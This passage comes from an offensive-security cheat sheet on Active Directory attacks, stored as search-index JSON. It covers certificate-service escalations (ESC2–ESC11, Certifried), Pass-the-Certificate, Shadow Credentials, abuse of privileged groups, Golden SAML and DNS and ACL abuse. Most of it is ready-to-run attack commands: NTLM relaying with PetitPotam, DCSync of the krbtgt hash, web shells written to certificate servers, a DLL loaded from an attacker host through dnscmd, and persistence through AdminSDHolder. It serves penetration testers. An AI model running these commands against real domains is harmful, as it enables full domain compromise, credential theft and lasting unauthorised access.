Endpoints.</p>"},{"location":"active-directory/active-directory-attacks/#esc2-misconfigured-certificate-templates","title":"ESC2 - Misconfigured Certificate Templates","text":"<p>Requirements * Allows requesters to specify a Subject Alternative Name (SAN) in the CSR as well as allows Any Purpose EKU (2.5.29.37.0) Exploitation * Find template   <pre><code>PS &gt; Get-ADObject -LDAPFilter '(&amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))' -SearchBase 'CN=Configuration,DC=megacorp,DC=local'\n</code></pre> * Request a certificate specifying the <code>/altname</code> as a domain admin like in ESC1.</p>"},{"location":"active-directory/active-directory-attacks/#esc3-misconfigured-enrollment-agent-templates","title":"ESC3 - Misconfigured Enrollment Agent Templates","text":"<p>ESC3 is when a certificate template specifies the Certificate Request Agent EKU (Enrollment Agent). This EKU can be used to request certificates on behalf of other users * Request a certificate based on the vulnerable certificate template ESC3.   <pre><code>$ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC3'\n[*] Saved certificate and private key to 'john.pfx'\n</code></pre> * Use the Certificate Request Agent certificate (-pfx) to request a certificate on behalf of other another user    <pre><code>$ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\\administrator' -pfx 'john.pfx'\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#esc4-access-control-vulnerabilities","title":"ESC4 - Access Control Vulnerabilities","text":"<p>Enabling the <code>mspki-certificate-name-flag</code> flag for a template that allows for domain authentication, allow attackers to \"push a misconfiguration to a template leading to ESC1 vulnerability * Search for <code>WriteProperty</code> with value <code>00000000-0000-0000-0000-000000000000</code> using modifyCertTemplate <pre><code>python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -get-acl\n</code></pre> * Add the <code>ENROLLEE_SUPPLIES_SUBJECT</code> (ESS) flag to perform ESC1   <pre><code>python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -add enrollee_supplies_subject -property mspki-Certificate-Name-Flag\n# Add/remove ENROLLEE_SUPPLIES_SUBJECT flag from the WebServer template. \nC:\\&gt;StandIn.exe --adcs --filter WebServer --ess --add\n</code></pre> * Perform ESC1 and then restore the value   <pre><code>python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -value 0 -property mspki-Certificate-Name-Flag\n</code></pre> Using Certipy <pre><code># overwrite the configuration to make it vulnerable to ESC1\ncertipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -save-old\n# request a certificate based on the ESC4 template, just like ESC1.\ncertipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC4' -alt 'administrator@corp.local'\n# restore the old configuration\ncertipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -configuration ESC4.json\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#esc6-editf_attributesubjectaltname2","title":"ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2","text":"<p>If this flag is set on the CA, any request (including when the subject is built from Active Directory) can have user defined values in the subject alternative name.  Exploitation * Use Certify.exe to check for UserSpecifiedSAN flag state which refers to the <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag.     <pre><code>Certify.exe cas\n</code></pre> * Request a certificate for a template and add an altname, even though the default <code>User</code> template doesn't normally allow to specify alternative names     <pre><code>.\\Certify.exe request /ca:dc.domain.local\\domain-DC-CA /template:User /altname:DomAdmin\n</code></pre> Mitigation * Remove the flag: <code>certutil.exe -config \"CA01.domain.local\\CA01\" -setreg \"policy\\EditFlags\" -EDITF_ATTRIBUTESUBJECTALTNAME2</code></p>"},{"location":"active-directory/active-directory-attacks/#esc7-vulnerable-certificate-authority-access-control","title":"ESC7 - Vulnerable Certificate Authority Access Control","text":"<p>Exploitation * Detect CAs that allow low privileged users the <code>ManageCA</code>  or <code>Manage Certificates</code> permissions     <pre><code>Certify.exe find /vulnerable\n</code></pre> * Change the CA settings to enable the SAN extension for all the templates under the vulnerable CA (ESC6)     <pre><code>Certify.exe setconfig /enablesan /restart\n</code></pre> * Request the certificate with the desired SAN.     <pre><code>Certify.exe request /template:User /altname:super.adm\n</code></pre> * Grant approval if required or disable the approval requirement     <pre><code># Grant\nCertify.exe issue /id:[REQUEST ID]\n# Disable\nCertify.exe setconfig /removeapproval /restart\n</code></pre> Alternative exploitation from ManageCA to RCE on ADCS server:  <pre><code># Get the current CDP list. Useful to find remote writable shares:\nCertify.exe writefile /ca:SERVER\\ca-name /readonly\n# Write an aspx shell to a local web directory:\nCertify.exe writefile /ca:SERVER\\ca-name /path:C:\\Windows\\SystemData\\CES\\CA-Name\\shell.aspx /input:C:\\Local\\Path\\shell.aspx\n# Write the default asp shell to a local web directory:\nCertify.exe writefile /ca:SERVER\\ca-name /path:c:\\inetpub\\wwwroot\\shell.asp\n# Write a php shell to a remote web directory:\nCertify.exe writefile /ca:SERVER\\ca-name /path:\\\\remote.server\\share\\shell.php /input:C:\\Local\\path\\shell.php\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#esc8-ad-cs-relay-attack","title":"ESC8 - AD CS Relay Attack","text":"<p>An attacker can trigger a Domain Controller using PetitPotam to NTLM relay credentials to a host of choice. The Domain Controller\u2019s NTLM Credentials can then be relayed to the Active Directory Certificate Services (AD CS) Web Enrollment pages, and a DC certificate can be enrolled. This certificate can then be used to request a TGT (Ticket Granting Ticket) and compromise the entire domain through Pass-The-Ticket. Require Impacket PR #1101 * Version 1: NTLM Relay + Rubeus + PetitPotam   <pre><code>impacket&gt; python3 ntlmrelayx.py -t http://&lt;ca-server&gt;/certsrv/certfnsh.asp -smb2support --adcs\nimpacket&gt; python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template VulnTemplate\n# For a member server or workstation, the template would be \"Computer\".\n# Other templates: workstation, DomainController, Machine, KerberosAuthentication\n# Coerce the authentication via MS-ESFRPC EfsRpcOpenFileRaw function with petitpotam \n# You can also use any other way to coerce the authentication like PrintSpooler via MS-RPRN\ngit clone https://github.com/topotam/PetitPotam\npython3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP\npython3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP\npython3 dementor.py &lt;listener&gt; &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; -d &lt;domain&gt;\npython3 dementor.py 10.10.10.250 10.10.10.10 -u user1 -p Password1 -d lab.local\n# Use the certificate with rubeus to request a TGT\nRubeus.exe asktgt /user:&lt;user&gt; /certificate:&lt;base64-certificate&gt; /ptt\nRubeus.exe asktgt /user:dc1$ /certificate:MIIRdQIBAzC...mUUXS /ptt\n# Now you can use the TGT to perform a DCSync\nmimikatz&gt; lsadump::dcsync /user:krbtgt\n</code></pre> * Version 2: NTLM Relay + Mimikatz + Kekeo   <pre><code>impacket&gt; python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController\n# Mimikatz\nmimikatz&gt; misc::efs /server:dc.lab.local /connect:&lt;IP&gt; /noauth\n# Kekeo\nkekeo&gt; base64 /input:on\nkekeo&gt; tgt::ask /pfx:&lt;BASE64-CERT-FROM-NTLMRELAY&gt; /user:dc$ /domain:lab.local /ptt\n# Mimikatz\nmimikatz&gt; lsadump::dcsync /user:krbtgt\n</code></pre> * Version 3: Kerberos Relay   <pre><code># Setup the relay\nsudo krbrelayx.py --target http://CA/certsrv -ip attacker_IP --victim target.domain.local --adcs --template Machine\n# Run mitm6\nsudo mitm6 --domain domain.local --host-allowlist target.domain.local --relay CA.domain.local -v\n</code></pre> * Version 4: ADCSPwn - Require <code>WebClient</code> service running on the domain controller. By default this service is not installed.   <pre><code>https://github.com/bats3c/ADCSPwn\nadcspwn.exe --adcs &lt;cs server&gt; --port [local port] --remote [computer]\nadcspwn.exe --adcs cs.pwnlab.local\nadcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --port 9001\nadcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --output C:\\Temp\\cert_b64.txt\nadcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --username pwnlab.local\\mranderson --password The0nly0ne! --dc dc.pwnlab.local\n# ADCSPwn arguments\nadcs            -       This is the address of the AD CS server which authentication will be relayed to.\nsecure          -       Use HTTPS with the certificate service.\nport            -       The port ADCSPwn will listen on.\nremote          -       Remote machine to trigger authentication from.\nusername        -       Username for non-domain context.\npassword        -       Password for non-domain context.\ndc              -       Domain controller to query for Certificate Templates (LDAP).\nunc             -       Set custom UNC callback path for EfsRpcOpenFileRaw (Petitpotam) .\noutput          -       Output path to store base64 generated crt.\n</code></pre> * Version 5: Certipy ESC8   <pre><code>certipy relay -ca 172.16.19.100\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#esc9-no-security-extension","title":"ESC9 - No Security Extension","text":"<p>Requirements * <code>StrongCertificateBindingEnforcement</code> set to <code>1</code> (default) or <code>0</code> * Certificate contains the <code>CT_FLAG_NO_SECURITY_EXTENSION</code> flag in the <code>msPKI-Enrollment-Flag</code> value * Certificate specifies <code>Any Client</code> authentication EKU * <code>GenericWrite</code> over any account A to compromise any account B Scenario John@corp.local has GenericWrite over Jane@corp.local, and we want to compromise Administrator@corp.local.  Jane@corp.local is allowed to enroll in the certificate template ESC9 that specifies the CT_FLAG_NO_SECURITY_EXTENSION flag in the msPKI-Enrollment-Flag value. * Obtain the hash of Jane with Shadow Credentials (using our GenericWrite)     <pre><code>certipy shadow auto -username John@corp.local -p Passw0rd -account Jane\n</code></pre> * Change the userPrincipalName of Jane to be Administrator.  leave the <code>@corp.local</code> part     <pre><code>certipy account update -username John@corp.local -password Passw0rd -user Jane -upn Administrator\n</code></pre> * Request the vulnerable certificate template ESC9 from Jane's account.     <pre><code>certipy req -username jane@corp.local -hashes ... -ca corp-DC-CA -template ESC9\n# userPrincipalName in the certificate is Administrator \n# the issued certificate contains no \"object SID\"\n</code></pre> * Restore userPrincipalName of Jane to Jane@corp.local.     <pre><code>certipy account update -username John@corp.local -password Passw0rd -user Jane@corp.local\n</code></pre> * Authenticate with the certificate and receive the NT hash of the Administrator@corp.local user.      <pre><code>certipy auth -pfx administrator.pfx -domain corp.local\n# Add -domain &lt;domain&gt; to your command line since there is no domain specified in the certificate.\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#esc11-relaying-ntlm-to-icpr","title":"ESC11 - Relaying NTLM to ICPR","text":"<p>Encryption is not enforced for ICPR requests and Request Disposition is set to Issue Requirements: * sploutchy/Certipy - Certipy fork * sploutchy/impacket - Impacket fork Exploitation: 1. Look for <code>Enforce Encryption for Requests: Disabled</code> in <code>certipy find -u user@dc1.lab.local -p 'REDACTED' -dc-ip 10.10.10.10 -stdout</code> output 2. Setup a relay using Impacket ntlmrelay and trigger a connection to it.     <pre><code>ntlmrelayx.py -t rpc://10.10.10.10 -rpc-mode ICPR -icpr-ca-name lab-DC-CA -smb2support\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#certifried-cve-2022-26923","title":"Certifried CVE-2022-26923","text":"<p>An authenticated user could manipulate attributes on computer accounts they own or manage, and acquire a certificate from Active Directory Certificate Services that would allow elevation of privilege. * Find <code>ms-DS-MachineAccountQuota</code> <pre><code>python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 getObjectAttributes  'DC=lab,DC=local' ms-DS-MachineAccountQuota \n</code></pre> * Add a new computer in the Active Directory, by default <code>MachineAccountQuota = 10</code> <pre><code>python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 addComputer cve 'CVEPassword1234*'\ncertipy account create 'lab.local/username:Password123*@dc.lab.local' -user 'cve' -dns 'dc.lab.local'\n</code></pre> * [ALTERNATIVE] If you are <code>SYSTEM</code> and the <code>MachineAccountQuota=0</code>: Use a ticket for the current machine and reset its SPN   <pre><code>Rubeus.exe tgtdeleg\nexport KRB5CCNAME=/tmp/ws02.ccache\npython bloodyAD -d lab.local -u 'ws02$' -k --host dc.lab.local setAttribute 'CN=ws02,CN=Computers,DC=lab,DC=local' servicePrincipalName '[]'\n</code></pre> * Set the <code>dNSHostName</code> attribute to match the Domain Controller hostname   <pre><code>python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 setAttribute 'CN=cve,CN=Computers,DC=lab,DC=local' dNSHostName '[\"DC.lab.local\"]'\npython bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 getObjectAttributes 'CN=cve,CN=Computers,DC=lab,DC=local' dNSHostName\n</code></pre> * Request a ticket   <pre><code># certipy req 'domain.local/cve$:CVEPassword1234*@ADCS_IP' -template Machine -dc-ip DC_IP -ca discovered-CA\ncertipy req 'lab.local/cve$:CVEPassword1234*@10.100.10.13' -template Machine -dc-ip 10.10.10.10 -ca lab-ADCS-CA\n</code></pre> * Either use the pfx or set a RBCD on your machine account to takeover the domain   <pre><code>certipy auth -pfx ./dc.pfx -dc-ip 10.10.10.10\nopenssl pkcs12 -in dc.pfx -out dc.pem -nodes\npython bloodyAD.py -d lab.local  -c \":dc.pem\" -u 'cve$' --host 10.10.10.10 setRbcd 'CVE$' 'CRASHDC$'\ngetST.py -spn LDAP/CRASHDC.lab.local -impersonate Administrator -dc-ip 10.10.10.10 'lab.local/cve$:CVEPassword1234*'   \nsecretsdump.py -user-status -just-dc-ntlm -just-dc-user krbtgt 'lab.local/Administrator@dc.lab.local' -k -no-pass -dc-ip 10.10.10.10 -target-ip 10.10.10.10 \n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#pass-the-certificate","title":"Pass-The-Certificate","text":"<p>Pass the Certificate in order to get a TGT, this technique is used in \"UnPAC the Hash\" and \"Shadow Credential\" * Windows   <pre><code># Information about a cert file\ncertutil -v -dump admin.pfx\n# From a Base64 PFX\nRubeus.exe asktgt /user:\"TARGET_SAMNAME\" /certificate:cert.pfx /password:\"CERTIFICATE_PASSWORD\" /domain:\"FQDN_DOMAIN\" /dc:\"DOMAIN_CONTROLLER\" /show\n# Grant DCSync rights to an user\n./PassTheCert.exe --server dc.domain.local --cert-path C:\\cert.pfx --elevate --target \"DC=domain,DC=local\" --sid &lt;user_SID&gt;\n# To restore\n./PassTheCert.exe --server dc.domain.local --cert-path C:\\cert.pfx --elevate --target \"DC=domain,DC=local\" --restore restoration_file.txt\n</code></pre> * Linux   <pre><code># Base64-encoded PFX certificate (string) (password can be set)\ngettgtpkinit.py -pfx-base64 $(cat \"PATH_TO_B64_PFX_CERT\") \"FQDN_DOMAIN/TARGET_SAMNAME\" \"TGT_CCACHE_FILE\"\n\u200b\n# PEM certificate (file) + PEM private key (file)\ngettgtpkinit.py -cert-pem \"PATH_TO_PEM_CERT\" -key-pem \"PATH_TO_PEM_KEY\" \"FQDN_DOMAIN/TARGET_SAMNAME\" \"TGT_CCACHE_FILE\"\n# PFX certificate (file) + password (string, optionnal)\ngettgtpkinit.py -cert-pfx \"PATH_TO_PFX_CERT\" -pfx-pass \"CERT_PASSWORD\" \"FQDN_DOMAIN/TARGET_SAMNAME\" \"TGT_CCACHE_FILE\"\n# Using Certipy\ncertipy auth -pfx \"PATH_TO_PFX_CERT\" -dc-ip 'dc-ip' -username 'user' -domain 'domain'\ncertipy cert -export -pfx \"PATH_TO_PFX_CERT\" -password \"CERT_PASSWORD\" -out \"unprotected.pfx\"\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#unpac-the-hash","title":"UnPAC The Hash","text":"<p>Using the UnPAC The Hash method, you can retrieve the NT Hash for an User via its certificate. * Windows     <pre><code># Request a ticket using a certificate and use /getcredentials to retrieve the NT hash in the PAC.\nRubeus.exe asktgt /getcredentials /user:\"TARGET_SAMNAME\" /certificate:\"BASE64_CERTIFICATE\" /password:\"CERTIFICATE_PASSWORD\" /domain:\"FQDN_DOMAIN\" /dc:\"DOMAIN_CONTROLLER\" /show\n</code></pre> * Linux     <pre><code># Obtain a TGT by validating a PKINIT pre-authentication\n$ gettgtpkinit.py -cert-pfx \"PATH_TO_CERTIFICATE\" -pfx-pass \"CERTIFICATE_PASSWORD\" \"FQDN_DOMAIN/TARGET_SAMNAME\" \"TGT_CCACHE_FILE\"\n\n# Use the session key to recover the NT hash\n$ export KRB5CCNAME=\"TGT_CCACHE_FILE\" getnthash.py -key 'AS-REP encryption key' 'FQDN_DOMAIN'/'TARGET_SAMNAME'\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#shadow-credentials","title":"Shadow Credentials","text":"<p>Add Key Credentials to the attribute <code>msDS-KeyCredentialLink</code> of the target user/computer object and then perform Kerberos authentication as that account using PKINIT to obtain a TGT for that user.  When trying to pre-authenticate with PKINIT, the KDC will check that the authenticating user has knowledge of the matching private key, and a TGT will be sent if there is a match.  User objects can't edit their own <code>msDS-KeyCredentialLink</code> attribute while computer objects can. Computer objects can edit their own msDS-KeyCredentialLink attribute but can only add a KeyCredential if none already exists Requirements: * Domain Controller on (at least) Windows Server 2016 * Domain must have Active Directory <code>Certificate Services</code> and <code>Certificate Authority</code> configured * PKINIT Kerberos authentication * An account with the delegated rights to write to the <code>msDS-KeyCredentialLink</code> attribute of the target object Exploitation:  - From Windows, use Whisker:   <pre><code># Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.\nWhisker.exe list /target:computername$\n# Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device.\nWhisker.exe add /target:\"TARGET_SAMNAME\" /domain:\"FQDN_DOMAIN\" /dc:\"DOMAIN_CONTROLLER\" /path:\"cert.pfx\" /password:\"pfx-password\"\nWhisker.exe add /target:computername$ [/domain:constoso.local /dc:dc1.contoso.local /path:C:\\path\\to\\file.pfx /password:P@ssword1]\n# Removes a key credential from the target object specified by a DeviceID GUID.\nWhisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /remove:2de4643a-2e0b-438f-a99d-5cb058b3254b\n</code></pre> - From Linux, use pyWhisker:   <pre><code># Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.\npython3 pywhisker.py -d \"domain.local\" -u \"user1\" -p \"complexpassword\" --target \"user2\" --action \"list\"\n# Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device.\npywhisker.py -d \"FQDN_DOMAIN\" -u \"user1\" -p \"CERTIFICATE_PASSWORD\" --target \"TARGET_SAMNAME\" --action \"list\"\npython3 pywhisker.py -d \"domain.local\" -u \"user1\" -p \"complexpassword\" --target \"user2\" --action \"add\" --filename \"test1\"\n# Removes a key credential from the target object specified by a DeviceID GUID.\npython3 pywhisker.py -d \"domain.local\" -u \"user1\" -p \"complexpassword\" --target \"user2\" --action \"remove\" --device-id \"a8ce856e-9b58-61f9-8fd3-b079689eb46e\"\n</code></pre> Scenario: - Scenario 1: Shadow Credential relaying   - Trigger an NTLM authentication from <code>DC01</code> (PetitPotam)   - Relay it to <code>DC02</code> (ntlmrelayx)   - Edit <code>DC01</code>'s attribute to create a Kerberos PKINIT pre-authentication backdoor (pywhisker)   - Alternatively : <code>ntlmrelayx -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$'</code> - Scenario 2: Workstation Takeover with RBCD   <pre><code># Only for C2: Add Reverse Port Forward from 8081 to Team Server 81\n# Set up ntlmrelayx to relay authentication from target workstation to DC \nproxychains python3 ntlmrelayx.py -t ldaps://dc1.ez.lab --shadow-credentials --shadow-target ws2\\$ --http-port 81\n# Execute printer bug to trigger authentication from target workstation \nproxychains python3 printerbug.py ez.lab/matt:Password1\\!@ws2.ez.lab ws1@8081/file\n# Get a TGT using the newly acquired certificate via PKINIT \nproxychains python3 gettgtpkinit.py ez.lab/ws2\\$ ws2.ccache -cert-pfx /opt/impacket/examples/T12uyM5x.pfx -pfx-pass 5j6fNfnsU7BkTWQOJhpR\n# Get a ST (service ticket) for the target account \nproxychains python3 gets4uticket.py kerberos+ccache://ez.lab\\\\ws2\\$:ws2.ccache@dc1.ez.lab cifs/ws2.ez.lab@ez.lab administrator@ez.lab administrator_tgs.ccache -v\n# Utilize the ST for future activity \nexport KRB5CCNAME=/opt/pkinittools/administrator_ws2.ccache\nproxychains python3 wmiexec.py -k -no-pass ez.lab/administrator@ws2.ez.lab\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#active-directory-groups","title":"Active Directory Groups","text":""},{"location":"active-directory/active-directory-attacks/#dangerous-built-in-groups-usage","title":"Dangerous Built-in Groups Usage","text":"<p>If you do not want modified ACLs to be overwritten every hour, you should change ACL template on the object <code>CN=AdminSDHolder,CN=System</code> or set <code>\"dminCount</code> attribute to <code>0</code> for the required object.</p> <p>The AdminCount attribute is set to <code>1</code> automatically when a user is assigned to any privileged group, but it is never automatically unset when the user is removed from these group(s). Find users with <code>AdminCount=1</code>. <pre><code>crackmapexec ldap 10.10.10.10 -u username -p password --admin-count\n# or\npython ldapdomaindump.py -u example.com\\john -p pass123 -d ';' 10.10.10.10\njq -r '.[].attributes | select(.adminCount == [1]) | .sAMAccountName[]' domain_users.json\n# or\nGet-ADUser -LDAPFilter \"(objectcategory=person)(samaccountname=*)(admincount=1)\"\nGet-ADGroup -LDAPFilter \"(objectcategory=group) (admincount=1)\"\n# or\n([adsisearcher]\"(AdminCount=1)\").findall()\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#adminsdholder-abuse","title":"AdminSDHolder Abuse","text":"<p>The Access Control List (ACL) of the AdminSDHolder object is used as a template to copy permissions to all \"protected groups\" in Active Directory and their members. Protected groups include privileged groups such as Domain Admins, Administrators, Enterprise Admins, and Schema Admins. If you modify the permissions of AdminSDHolder, that permission template will be pushed out to all protected accounts automatically by <code>SDProp</code> (in an hour). E.g: if someone tries to delete this user from the Domain Admins in an hour or less, the user will be back in the group. <pre><code># Add a user to the AdminSDHolder group:\nAdd-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -PrincipalIdentity username -Rights All -Verbose\n# Right to reset password for toto using the account titi\nAdd-ObjectACL -TargetSamAccountName toto -PrincipalSamAccountName titi -Rights ResetPassword\n# Give all rights\nAdd-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName toto -Verbose -Rights All\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#abusing-dns-admins-group","title":"Abusing DNS Admins Group","text":"<p>It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM).  Require privileges to restart the DNS service. * Enumerate members of DNSAdmins group     <pre><code>Get-NetGroupMember -GroupName \"DNSAdmins\"\nGet-ADGroupMember -Identity DNSAdmins\n</code></pre> * Change dll loaded by the DNS service     <pre><code># with RSAT\ndnscmd &lt;servername&gt; /config /serverlevelplugindll \\\\attacker_IP\\dll\\mimilib.dll\ndnscmd 10.10.10.11 /config /serverlevelplugindll \\\\10.10.10.10\\exploit\\privesc.dll\n# with DNSServer module\n$dnsettings = Get-DnsServerSetting -ComputerName &lt;servername&gt; -Verbose -All\n$dnsettings.ServerLevelPluginDll = \"\\attacker_IP\\dll\\mimilib.dll\"\nSet-DnsServerSetting -InputObject $dnsettings -ComputerName &lt;servername&gt; -Verbose\n</code></pre> * Check the previous command success     <pre><code>Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\\ -Name ServerLevelPluginDll\n</code></pre> * Restart DNS     <pre><code>sc \\\\dc01 stop dns\nsc \\\\dc01 start dns\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#abusing-schema-admins-group","title":"Abusing Schema Admins Group","text":"<p>The Schema Admins group is a security group in Microsoft Active Directory that provides its members with the ability to make changes to the schema of an Active Directory forest. The schema defines the structure of the Active Directory database, including the attributes and object classes that are used to store information about users, groups, computers, and other objects in the directory.</p>"},{"location":"active-directory/active-directory-attacks/#abusing-backup-operators-group","title":"Abusing Backup Operators Group","text":"<p>Members of the Backup Operators group can back up and restore all files on a computer, regardless of the permissions that protect those files. Backup Operators also can log on to and shut down the computer. This group cannot be renamed, deleted, or moved. By default, this built-in group has no members, and it can perform backup and restore operations on domain controllers. This groups grants the following privileges : - SeBackup privileges - SeRestore privileges * Get members of the group:   <pre><code>PowerView&gt; Get-NetGroupMember -Identity \"Backup Operators\" -Recurse\n</code></pre> * Enable privileges using giuliano108/SeBackupPrivilege <pre><code>Import-Module .\\SeBackupPrivilegeUtils.dll\nImport-Module .\\SeBackupPrivilegeCmdLets.dll\nSet-SeBackupPrivilege\nGet-SeBackupPrivilege\n</code></pre> * Retrieve sensitive files   <pre><code>Copy-FileSeBackupPrivilege C:\\Users\\Administrator\\flag.txt C:\\Users\\Public\\flag.txt -Overwrite\n</code></pre> * Retrieve content of AutoLogon in the HKLM\\SOFTWARE hive   <pre><code>$reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', 'dc.htb.local',[Microsoft.Win32.RegistryView]::Registry64)\n$winlogon = $reg.OpenSubKey('SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon')\n$winlogon.GetValueNames() | foreach {\"$_ : $(($winlogon).GetValue($_))\"}\n</code></pre> * Retrieve SAM,SECURITY and SYSTEM hives   * mpgn/BackupOperatorToDA: <code>.\\BackupOperatorToDA.exe -t \\\\dc1.lab.local -u user -p pass -d domain -o \\\\10.10.10.10\\SHARE\\</code>   * improsec/BackupOperatorToolkit: <code>.\\BackupOperatorToolkit.exe DUMP \\\\PATH\\To\\Dump \\\\TARGET.DOMAIN.DK</code></p>"},{"location":"active-directory/active-directory-attacks/#active-directory-federation-services","title":"Active Directory Federation Services","text":""},{"location":"active-directory/active-directory-attacks/#adfs-golden-saml","title":"ADFS - Golden SAML","text":"<p>Requirements: * ADFS service account * The private key (PFX with the decryption password) Exploitation: * Run mandiant/ADFSDump on AD FS server as the AD FS service account. It will query the Windows Internal Database (WID): <code>\\\\.\\pipe\\MICROSOFT##WID\\tsql\\query</code> * Convert PFX and Private Key to binary format     <pre><code># For the pfx\necho AAAAAQAAAAAEE[...]Qla6 | base64 -d &gt; EncryptedPfx.bin\n# For the private key\necho f7404c7f[...]aabd8b | xxd -r -p &gt; dkmKey.bin \n</code></pre> * Create the Golden SAML using mandiant/ADFSpoof, you might need to update the dependencies.     <pre><code>mkdir ADFSpoofTools\ncd $_\ngit clone https://github.com/dmb2168/cryptography.git\ngit clone https://github.com/mandiant/ADFSpoof.git \nvirtualenv3 venvADFSSpoof\nsource venvADFSSpoof/bin/activate\npip install lxml\npip install signxml\npip uninstall -y cryptography\ncd cryptography\npip install -e .\ncd ../ADFSpoof\npip install -r requirements.txt\npython ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s adfs.pentest.lab saml2 --endpoint https://www.contoso.com/adfs/ls\n/SamlResponseServlet --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient --nameid 'PENTEST\\administrator' --rpidentifier Supervision --assertions '&lt;Attribute Name=\"http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname\"&gt;&lt;AttributeValue&gt;PENTEST\\administrator&lt;/AttributeValue&gt;&lt;/Attribute&gt;'\n</code></pre> Other interesting tools to exploit AD FS:  * WhiskeySAML</p>"},{"location":"active-directory/active-directory-attacks/#active-directory-integrated-dns","title":"Active Directory Integrated DNS","text":"<p>ADIDNS zone DACL (Discretionary Access Control List) enables regular users to create child objects by default, attackers can leverage that and hijack traffic. Active Directory will need some time (~180 seconds) to sync LDAP changes via its DNS dynamic updates protocol. * Enumerate all records using dirkjanm/adidnsdump <pre><code>adidnsdump -u DOMAIN\\\\user --print-zones dc.domain.corp (--dns-tcp)\n</code></pre> * Query a node using dirkjanm/krbrelayx <pre><code>dnstool.py -u 'DOMAIN\\user' -p 'password' --record '*' --action query $DomainController (--legacy)\n</code></pre> * Add a node and attach a record     <pre><code>dnstool.py -u 'DOMAIN\\user' -p 'password' --record '*' --action add --data $AttackerIP $DomainController\n</code></pre> The common way to abuse ADIDNS is to set a wildcard record and then passively listen to the network. <pre><code>Invoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3 -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#abusing-active-directory-aclsaces","title":"Abusing Active Directory ACLs/ACEs","text":"<p>Check ACL for an User with ADACLScanner. <pre><code>ADACLScan.ps1 -Base \"DC=contoso;DC=com\" -Filter \"(&amp;(AdminCount=1))\" -Scope subtree -EffectiveRightsPrincipal User1 -Output HTML -Show\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#genericall","title":"GenericAll","text":"<ul> <li>GenericAll on User : We can reset user's password without knowing the current password</li> <li>GenericAll on Group : Effectively, this allows us to add ourselves (the user hacker) to the Domain Admin group : <ul> <li>On Windows : <code>net group \"domain admins\" hacker /add /domain</code></li> <li>On Linux:<ul> <li>using the Samba software suite :  <code>net rpc group ADDMEM \"GROUP NAME\" UserToAdd -U 'hacker%MyPassword123' -W DOMAIN -I [DC IP]</code></li> <li>using bloodyAD:  <code>bloodyAD.py --host [DC IP] -d DOMAIN -u hacker -p MyPassword123 addObjectToGroup UserToAdd 'GROUP NAME'</code></li> </ul> </li> </ul> </li> <li>GenericAll/GenericWrite : We can set a SPN on a target account, request a Service Ticket (ST), then grab 